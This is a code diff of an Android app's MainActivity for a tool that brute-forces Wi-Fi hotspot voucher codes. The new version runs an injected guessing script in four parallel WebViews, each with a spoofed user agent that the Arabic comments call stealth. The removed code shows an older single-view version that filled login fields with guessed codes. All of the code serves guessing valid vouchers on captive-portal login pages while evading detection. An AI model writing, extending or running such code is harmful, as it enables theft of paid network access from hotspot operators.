@@ -5,233 +5,137 @@ import android.app.Activity;
 import android.app.AlertDialog;
 import android.content.SharedPreferences;
 import android.os.Bundle;
-import android.os.Handler;
-import android.os.Looper;
-import android.view.View;
 import android.webkit.*;
 import android.widget.*;
-import java.net.URI;
+import java.io.InputStream;
+import java.nio.charset.StandardCharsets;
+import java.util.Random;
 
-public class MainActivity extends Activity implements CrackerEngine.Listener {
-    private WebView webView;
-    private EditText urlBar;
-    private ProgressBar progressBar;
-    private LinearLayout panel;
-    private ScrollView logScroll;
-    private TextView logText, voucherResult, statusText;
-    private EditText etPrefix, etSuffix, etDigits, etAttempts;
-    private EditText etPause, etRetry, etStatusEvery, etRttEvery;
+public class MainActivity extends Activity {
+    private WebView[] webs = new WebView[4];
+    private EditText urlBar, etPrefix, etSuffix, etDigits, etAttempts;
+    private TextView statusText;
     private SharedPreferences prefs;
-    private StringBuilder logBuf = new StringBuilder();
-    private Handler uiHandler = new Handler(Looper.getMainLooper());
-    private boolean logUpdatePending = false;
-    private String currentNetwork = "default";
-    private String finderJs = "";
-    private CrackerEngine engine;
+    private String jsCode = "";
+    private String targetUrl = "";
+    private final String[] UAS = {
+        "Mozilla/5.0 (Linux; Android 13; SM-S911B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
+        "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
+        "Mozilla/5.0 (Linux; Android 11; SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36",
+        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1"
+    };
 
     @SuppressLint("SetJavaScriptEnabled")
     @Override protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
-        try {
-            java.io.InputStream is = getAssets().open("finder.js");
-            byte[] buf = new byte[is.available()];
-            is.read(buf); is.close();
-            finderJs = new String(buf, java.nio.charset.StandardCharsets.UTF_8);
-        } catch (Exception e) {}
         prefs = getSharedPreferences("finder", MODE_PRIVATE);
 
-        webView = findViewById(R.id.webView);
         urlBar = findViewById(R.id.urlBar);
-        progressBar = findViewById(R.id.progressBar);
-        panel = findViewById(R.id.panel);
-        logScroll = findViewById(R.id.logScroll);
-        logText = findViewById(R.id.logText);
-        voucherResult = findViewById(R.id.voucherResult);
-        statusText = findViewById(R.id.statusText);
         etPrefix = findViewById(R.id.etPrefix);
         etSuffix = findViewById(R.id.etSuffix);
         etDigits = findViewById(R.id.etDigits);
         etAttempts = findViewById(R.id.etAttempts);
-        etPause = findViewById(R.id.etPause);
-        etRetry = findViewById(R.id.etRetry);
-        etStatusEvery = findViewById(R.id.etStatusEvery);
-        etRttEvery = findViewById(R.id.etRttEvery);
+        statusText = findViewById(R.id.statusText);
+        
+        webs[0] = findViewById(R.id.web0);
+        webs[1] = findViewById(R.id.web1);
+        webs[2] = findViewById(R.id.web2);
+        webs[3] = findViewById(R.id.web3);
 
-        etPrefix.setText(prefs.getString("prefix", ""));
-        etSuffix.setText(prefs.getString("suffix", ""));
-        etDigits.setText(prefs.getString("digits", "2"));
+        urlBar.setText(prefs.getString("url", "http://7.7.7.7/index.html"));
+        etPrefix.setText(prefs.getString("prefix", "5"));
+        etSuffix.setText(prefs.getString("suffix", "31"));
+        etDigits.setText(prefs.getString("digits", "7"));
         etAttempts.setText(prefs.getString("attempts", "1000"));
-        etPause.setText(prefs.getString("pause", "100"));
-        etRetry.setText(prefs.getString("retry", "1500"));
-        etStatusEvery.setText(prefs.getString("statusEvery", "50"));
-        etRttEvery.setText(prefs.getString("threads", "15"));
 
-        CookieManager.getInstance().setAcceptCookie(true);
-        CookieManager.getInstance().setAcceptThirdPartyCookies(webView, true);
+        try {
+            InputStream is = getAssets().open("finder.js");
+            byte[] buf = new byte[is.available()];
+            is.read(buf); is.close();
+            jsCode = new String(buf, StandardCharsets.UTF_8);
+        } catch (Exception e) { statusText.setText("خطأ تحميل السكربت"); }
 
-        WebSettings s = webView.getSettings();
-        s.setJavaScriptEnabled(true);
-        s.setDomStorageEnabled(true);
-        s.setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);
-        s.setAllowFileAccess(true);
-        webView.setBackgroundColor(0xFF000000);
-
-        webView.setWebViewClient(new WebViewClient() {
-            @Override public void onPageFinished(WebView v, String u) {
-                urlBar.setText(u);
-                progressBar.setVisibility(View.GONE);
-            }
-        });
-        webView.setWebChromeClient(new WebChromeClient() {
-            @Override public void onProgressChanged(WebView v, int p) {
-                progressBar.setProgress(p);
-                progressBar.setVisibility(p < 100 ? View.VISIBLE : View.GONE);
-            }
-        });
-
-        findViewById(R.id.btnGo).setOnClickListener(v -> navigate());
-        findViewById(R.id.btnBack).setOnClickListener(v -> { if (webView.canGoBack()) webView.goBack(); });
-        findViewById(R.id.btnForward).setOnClickListener(v -> { if (webView.canGoForward()) webView.goForward(); });
-        findViewById(R.id.btnRefresh).setOnClickListener(v -> webView.reload());
-        findViewById(R.id.btnFinder).setOnClickListener(v -> {
-            panel.setVisibility(panel.getVisibility() == View.VISIBLE ? View.GONE : View.VISIBLE);
-        });
-        findViewById(R.id.btnStart).setOnClickListener(v -> startCracker());
-        findViewById(R.id.btnStop).setOnClickListener(v -> stopCracker());
-        findViewById(R.id.btnClear).setOnClickListener(v -> clearAll());
-
-        webView.loadUrl("http://connectivitycheck.gstatic.com/generate_204");
-    }
-
-    private void navigate() {
-        String u = urlBar.getText().toString().trim();
-        if (u.isEmpty()) return;
-        if (!u.startsWith("http")) u = "http://" + u;
-        webView.loadUrl(u);
-    }
-
-    private void clearAll() {
-        new AlertDialog.Builder(this)
-            .setTitle("مسح شامل")
-            .setMessage("سيتم مسح كل الأرقام المجربة والكوكيز. هل أنت متأكد؟")
-            .setPositiveButton("نعم", (d, w) -> {
-                if (engine != null) { engine.stop(); engine = null; }
-                prefs.edit().remove("tried_" + currentNetwork).apply();
-                CookieManager.getInstance().removeAllCookies(null);
-                CookieManager.getInstance().flush();
-                logBuf.setLength(0);
-                logText.setText("🗑️ تم المسح.\n");
-                statusText.setText("متوقف");
-                findViewById(R.id.btnStart).setEnabled(true);
-                findViewById(R.id.btnStop).setEnabled(false);
-                Toast.makeText(this, "تم المسح", Toast.LENGTH_SHORT).show();
-            })
-            .setNegativeButton("إلغاء", null)
-            .show();
-    }
-
-    private void startCracker() {
-        String url = webView.getUrl();
-        if (url == null || !url.contains("/")) {
-            Toast.makeText(this, "افتح صفحة الدخول أولاً", Toast.LENGTH_SHORT).show();
-            return;
+        // إعداد المتصفحات الأربعة ببصمات مختلفة (تخفي)
+        for (int i = 0; i < 4; i++) {
+            WebSettings s = webs[i].getSettings();
+            s.setJavaScriptEnabled(true);
+            s.setDomStorageEnabled(true);
+            s.setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);
+            s.setUserAgentString(UAS[i]); // كل شاشة لها بصمة مختلفة
+            CookieManager.getInstance().setAcceptThirdPartyCookies(webs[i], true);
+            webs[i].addJavascriptInterface(new Bridge(i), "AndroidBridge" + i);
         }
-        if (!url.contains("/login")) url = url.replaceAll("/+$", "") + "/login";
 
-        try { currentNetwork = new URI(url).getHost(); }
-        catch (Exception e) { currentNetwork = "default"; }
-
-        String prefix = etPrefix.getText().toString().trim();
-        String suffix = etSuffix.getText().toString().trim();
-        int digits = pi(etDigits, 2);
-        int attempts = pi(etAttempts, 100);
-        int pause = pi(etPause, 300);
-
-        logBuf.setLength(0);
-        logText.setText("▶ بدء التخمين المرئي...\n");
-        voucherResult.setVisibility(View.GONE);
-        statusText.setText("جاري التخمين...");
-        findViewById(R.id.btnStart).setEnabled(false);
-        findViewById(R.id.btnStop).setEnabled(true);
-
-        String cfg = "window.FINDER_CONFIG={"
-            + "url:'" + url + "',"
-            + "prefix:'" + prefix + "',"
-            + "suffix:'" + suffix + "',"
-            + "digits:" + digits + ","
-            + "attempts:" + attempts + ","
-            + "pause:" + pause + "};";
-        webView.evaluateJavascript(cfg, null);
-        webView.evaluateJavascript(finderJs, null);
-    }
-
-    private void stopCracker() {
-        if (engine != null) { engine.stop(); engine = null; }
-        statusText.setText("متوقف");
-        findViewById(R.id.btnStart).setEnabled(true);
-        findViewById(R.id.btnStop).setEnabled(false);
-    }
-
-    private int pi(EditText e, int def) {
-        try { return Integer.parseInt(e.getText().toString().trim()); }
-        catch (Exception ex) { return def; }
-    }
-
-    @Override public void onLog(final String msg) {
-        runOnUiThread(() -> {
-            logBuf.append(msg).append('\n');
-            if (logBuf.length() > 25000) logBuf.delete(0, 15000);
-            if (!logUpdatePending) {
-                logUpdatePending = true;
-                uiHandler.postDelayed(() -> {
-                    logText.setText(logBuf.toString());
-                    logScroll.post(() -> logScroll.fullScroll(ScrollView.FOCUS_DOWN));
-                    logUpdatePending = false;
-                }, 100);
-            }
+        findViewById(R.id.btnGo).setOnClickListener(v -> {
+            targetUrl = urlBar.getText().toString().trim();
+            if (!targetUrl.startsWith("http")) targetUrl = "http://" + targetUrl;
+            prefs.edit().putString("url", targetUrl).apply();
+            for (int i = 0; i < 4; i++) webs[i].loadUrl(targetUrl);
+            statusText.setText("تم تحميل الرابط في 4 شاشات");
         });
-    }
 
-    @Override public void onProgress(final int cur, final int total, final String v) {
-        runOnUiThread(() -> {
-            statusText.setText("[" + cur + "/" + total + "] " + v);
-            String js = "(function(){" +
-                "var i=document.querySelectorAll('input');" +
-                "for(var k=0;k<i.length;k++){" +
-                "var x=i[k];" +
-                "if(x.type==='text'||x.name==='username'||(x.id&&x.id.indexOf('username')>=0)||(x.id&&x.id.indexOf('voucher')>=0)){" +
-                "x.value='"+v+"';x.dispatchEvent(new Event('input',{bubbles:true}));break;" +
-                "}}})()";
-            webView.evaluateJavascript(js, null);
+        findViewById(R.id.btnStart).setOnClickListener(v -> startAll());
+        findViewById(R.id.btnStop).setOnClickListener(v -> stopAll());
+        findViewById(R.id.btnClear).setOnClickListener(v -> {
+            prefs.edit().remove("tried_" + targetUrl).apply();
+            CookieManager.getInstance().removeAllCookies(null);
+            CookieManager.getInstance().flush();
+            statusText.setText("تم مسح الكوكيز والأرقام");
         });
+
+        // تحميل أولي
+        targetUrl = urlBar.getText().toString();
+        for (int i = 0; i < 4; i++) webs[i].loadUrl(targetUrl);
     }
 
-    @Override public void onFound(final String voucher, final String statusJson) {
-        runOnUiThread(() -> {
-            onLog("═══════════════════════════════════");
-            onLog("✅✅✅ وجد الكرت: " + voucher);
-            onLog("═══════════════════════════════════");
-            voucherResult.setText("✅ الكرت: " + voucher);
-            voucherResult.setVisibility(View.VISIBLE);
-            statusText.setText("✅ وجد: " + voucher);
-            Toast.makeText(this, "✅ " + voucher, Toast.LENGTH_LONG).show();
-            findViewById(R.id.btnStart).setEnabled(true);
-            findViewById(R.id.btnStop).setEnabled(false);
+    private void startAll() {
+        prefs.edit()
+            .putString("prefix", etPrefix.getText().toString())
+            .putString("suffix", etSuffix.getText().toString())
+            .putString("digits", etDigits.getText().toString())
+            .putString("attempts", etAttempts.getText().toString())
+            .apply();
 
-            String js = "(function(){" +
-                "var i=document.querySelectorAll('input');" +
-                "for(var k=0;k<i.length;k++){" +
-                "var x=i[k];" +
-                "if(x.type==='text'||x.name==='username'||(x.id&&x.id.indexOf('username')>=0)||(x.id&&x.id.indexOf('voucher')>=0)){" +
-                "x.value='"+voucher+"';x.dispatchEvent(new Event('input',{bubbles:true}));break;" +
-                "}}})()";
-            webView.evaluateJavascript(js, null);
-        });
+        String p = etPrefix.getText().toString().trim();
+        String s = etSuffix.getText().toString().trim();
+        int d = parseInt(etDigits, 7);
+        int a = parseInt(etAttempts, 1000);
+
+        for (int i = 0; i < 4; i++) {
+            String cfg = "window.FINDER_CONFIG={id:" + i + ",prefix:'" + p + "',suffix:'" + s + "',digits:" + d + ",attempts:" + a + ",pause:200};";
+            webs[i].evaluateJavascript(cfg, null);
+            webs[i].evaluateJavascript(jsCode, null);
+        }
+        statusText.setText("▶ بدء التخمين في 4 شاشات...");
     }
 
-    @Override public void onBackPressed() {
-        if (webView.canGoBack()) webView.goBack();
-        else super.onBackPressed();
+    private void stopAll() {
+        for (int i = 0; i < 4; i++) {
+            webs[i].evaluateJavascript("window.stopFinder && window.stopFinder();", null);
+        }
+        statusText.setText("⏹ تم الإيقاف");
+    }
+
+    private int parseInt(EditText e, int def) {
+        try { return Integer.parseInt(e.getText().toString().trim()); } catch (Exception ex) { return def; }
+    }
+
+    public class Bridge {
+        private final int id;
+        public Bridge(int id) { this.id = id; }
+
+        @JavascriptInterface public void log(final String m) {
+            runOnUiThread(() -> statusText.setText("[W" + id + "] " + m));
+        }
+        @JavascriptInterface public void progress(final int c, final int t, final String v) {
+            runOnUiThread(() -> statusText.setText("[W" + id + "] [" + c + "/" + t + "] " + v));
+        }
+        @JavascriptInterface public void found(final String v, final String st) {
+            runOnUiThread(() -> {
+                statusText.setText("✅✅✅ W" + id + " وجد الكرت: " + v);
+                Toast.makeText(MainActivity.this, "✅ W" + id + ": " + v, Toast.LENGTH_LONG).show();
+            });
+        }
     }
 }
